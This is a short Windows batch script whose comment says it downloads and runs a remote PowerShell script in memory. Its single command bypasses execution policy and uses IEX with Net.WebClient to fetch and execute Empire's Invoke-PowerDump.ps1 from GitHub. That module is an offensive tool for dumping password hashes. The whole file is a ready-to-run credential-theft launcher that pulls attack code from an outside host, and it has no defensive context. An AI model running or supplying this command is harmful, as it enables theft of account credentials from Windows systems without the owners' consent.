@echo off
REM This CMD script downloads and executes a remote PowerShell script in memory.
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/credentials/Invoke-PowerDump.ps1')"
